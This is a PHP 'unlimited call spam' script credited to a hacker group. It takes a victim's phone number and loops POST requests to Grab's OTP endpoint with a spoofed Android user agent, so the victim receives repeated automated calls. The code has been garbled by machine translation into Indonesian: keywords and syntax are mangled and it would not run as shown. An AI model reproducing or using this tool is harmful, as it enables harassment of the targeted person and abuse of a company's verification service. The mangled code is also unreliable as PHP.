------------------------------------------------ | SPAM TELPON TANPA BATAS |
------------------------------------------------
| Athor = MR.N0N4M3 |
| TEAM = GALAXI CYBER ANONYMOUS |
| Spam TerlaluL = Telpon |
| 
| 
| Info = Gunakan Dengan Bijak Yee ^ _ ^ |
------------------------------------------------

<? php
sistem ( ' jelas ' );
function  get () {
	 trim kembali ( fgets ( STDIN ));
}
 prankcall kelas {
	 fungsi  publik __construct ( $ no ) {
		$ this -> number  =  $ no ;
	}
	 fungsi  pribadi get () {
		 trim kembali ( fgets ( STDIN ));
	}
	 fungsi  pribadi benar ( $ no ) {
		$ cek  =  substr ( $ no , 0 , 2 );
		if ( $ cek == " 08 " ) {
			$ no  =  " 62 " . substr ( $ no , 1 );
		}
		mengembalikan  $ no ;
	}
	 fungsi  pribadi ekse () {
		$ no  =  $ this -> correct ( $ this -> number );
		$ rand  =  rand ( 0123456 , 9999999 );
		$ rands  =  $ this -> randStr ( 12 );
		$ post  =  " method = CALL & countryCode = id & phoneNumber = $ no & templateID = pax_android_production " ;
		$ h [] =  " x-request-id: ebf61bc3-8092-4924-bf45- $ rands " ;
		$ h [] =  " Bahasa Terima: di-ID; q = 1.0, en-us; q = 0.9, en; q = 0.8 " ;
		$ h [] =  " User-Agent: Grab / 5.20.0 (Android 6.0.1; Build $ rand ) " ;
		$ h [] =  " Tipe Konten: application / x-www-form-urlencoded " ;
		$ h [] =  " Panjang Konten: " . strlen ( $ post );
		$ h [] =  " Host: api.grab.com " ;
		$ h [] =  " Koneksi: tutup " ;
		$ ch  =  curl_init ();
		curl_setopt ( $ ch , CURLOPT_URL , " https://api.grab.com/grabid/v1/phone/otp " );
		curl_setopt ( $ ch , CURLOPT_POST , 1 );
		curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ post );
		curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ h );
		curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
		$ x  =  curl_exec ( $ ch ); curl_close ( $ ch );
		$ ekse  =  json_decode ( $ x , true );
		if ( kosong ( $ ekse [ ' challengeID ' ])) {
			gema  " Gagal \ n " ;
		} lain {
			gema  " Sukses \ n " ;
		}
	}
	 loop fungsi  pribadi ( $ banyak , $ tidur = nol ) {
		$ a = 0 ;
		$ no  =  $ this -> correct ( $ this -> number );
		while ( $ a < $ many ) {
			$ rand  =  rand ( 0123456 , 9999999 );
			$ rands  =  $ this -> randStr ( 12 );
			$ post  =  " method = CALL & countryCode = id & phoneNumber = $ no & templateID = pax_android_production " ;
			$ h [] =  " x-request-id: ebf61bc3-8092-4924-bf45- $ rands " ;
			$ h [] =  " Bahasa Terima: di-ID; q = 1.0, en-us; q = 0.9, en; q = 0.8 " ;
			$ h [] =  " User-Agent: Grab / 5.20.0 (Android 6.0.1; Build $ rand ) " ;
			$ h [] =  " Tipe Konten: application / x-www-form-urlencoded " ;
			$ h [] =  " Panjang Konten: " . strlen ( $ post );
			$ h [] =  " Host: api.grab.com " ;
			$ h [] =  " Koneksi: tutup " ;
			$ ch  =  curl_init ();
			curl_setopt ( $ ch , CURLOPT_URL , " https://api.grab.com/grabid/v1/phone/otp " );
			curl_setopt ( $ ch , CURLOPT_POST , 1 );
			curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ post );
			curl_setopt ( $ ch , CURLOPT_HTTPHEADER , $ h );
			curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
			$ x  =  curl_exec ( $ ch ); curl_close ( $ ch );
			$ ekse  =  json_decode ( $ x , true );
			if ( kosong ( $ ekse [ ' challengeID ' ])) {
				melanjutkan ;
			} lain {
				$ nn  =  $ a + 1 ;
				echo  " [ $ nn ] Sukses \ r " ;
				$ a ++ ;
			}
			if ( $ sleep ! = null ) sleep ( $ sleep );
			if ( $ a > = $ many ) echo  " \ n Completed! \ n " ;
		}
	}
	 fungsi  pribadi randStr ( $ l ) {
		$ data  =  " abcdefghijklmnopqrstuvwxyz1234567890 " ;
		$ word  =  " " ;
		untuk ( $ a = 0 ; $ a < $ l ; $ a ++ ) {
			$ word  . =  $ data { rand ( 0 , strlen ( $ data ) - 1 )};
		}
		mengembalikan  $ kata ;
	}
	 menjalankan fungsi  publik () {
		while ( true ) {
			echo  " ====> Mode Banyak (y / n) = " ;
			$ loop  =  $ this -> get ();
			if ( $ loop == " y "  OR  $ loop == " n " ) {
				istirahat ;
			} lain {
				echo  " Jika ya jawab y Jika tidak bertanggung jawab n \ n " ;
				melanjutkan ;
			}
		}
		if ( $ loop == " y " ) {
			echo  " ====> JumlahSpam = " ;
			$ many  =  $ this -> get ();
			$ this -> loop ( $ many );
		} lain {
			$ this -> ekse ();
		}
	}
}
gema  "  \ n " ;
echo  " ------------------------------------------------ | SPAM TELPON TAK TERBATAS | --------------------------------------------- ---
| created = MR.N0N4M3 |
| Pembaruan = 07-Januari-2019 || Spam TerlaluL = Telpon |
| TEAM = GALAXI CYBER ANONYMOUS |
|  
| Info = Jangan ngerjain temen yang lagi mabar ^ _ ^ |
------------------------------------------------ \ n " ;
gema  "  \ n " ;
gema  "  \ n " ;
gema  " ________________________________________________ \ n " ;
gema  "  \ n " ;
gema  "  \ n " ;
echo  " ____ ____ _ _
/ ___ | _ __ __ _ _ __ ___ / ___ | __ _ | | |
\ ___ \ | '_ \ / _` | '_ `_ \ | | / _` | | |
___) | | _) | (_ | | | | | | __ | (_ | | | |
| ____ / | .__ / \ __, _ | _ | | _ | | _ | \ ____ \ __, _ | _ | _ |
      | _ |                              
                                    v.2.3 \ n " ;
gema  "  \ n " ;
tidur ( ' 0,4 ' );
echo  " ====> diterbitkan No Target = " ;
$ no  = get ();
$ n  =  prankCall baru  ( $ no );
$ n -> run ();
